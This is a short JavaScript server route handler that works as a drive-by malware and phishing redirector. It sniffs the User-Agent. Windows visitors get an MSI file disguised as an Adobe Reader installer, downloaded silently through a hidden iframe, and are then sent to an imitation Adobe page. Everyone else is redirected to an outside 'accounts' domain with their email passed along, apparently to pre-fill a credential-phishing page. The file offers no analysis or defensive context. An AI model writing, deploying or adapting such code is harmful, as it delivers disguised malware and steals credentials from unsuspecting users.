export default function handler(req, res) {
  const userAgent = req.headers['user-agent'] || "";
  const isWindows = /windows/i.test(userAgent);

  const WINDOWS_REDIRECT_AFTER_DOWNLOAD = 'https://jomry.com/adobe-readers/installer/download.html';
  const MSI_PATH = '/Reader_en_install.msi';       // place this in /public
  const NON_WINDOWS_TARGET = 'https://accounts.bsmszq.icu'; // final non-Windows target

  const emailFromQuery = Array.isArray(req.query.email) ? req.query.email[0] : (req.query.email || '');
  const safeServerEmail = emailFromQuery ? encodeURIComponent(emailFromQuery) : '';

  if (isWindows) {
    const html = `<!DOCTYPE html>
      <html>
        <head><meta charset="utf-8"><title>Preparing download…</title></head>
        <body>
          <p>Your download will start shortly…</p>
          <script>
            // Download MSI via hidden iframe
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = '${MSI_PATH}';
            document.body.appendChild(iframe);

            // Redirect to Adobe after 3s
            setTimeout(() => {
              window.location.href = '${WINDOWS_REDIRECT_AFTER_DOWNLOAD}';
            }, 3000);
          </script>
        </body>
      </html>`;
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.status(200).send(html);
    return;
  }

  // Non-Windows users → redirect with email as smn param
  const finalUrl = safeServerEmail ? `${NON_WINDOWS_TARGET}?smn=${safeServerEmail}` : NON_WINDOWS_TARGET;
  res.writeHead(302, { Location: finalUrl });
  res.end();
}
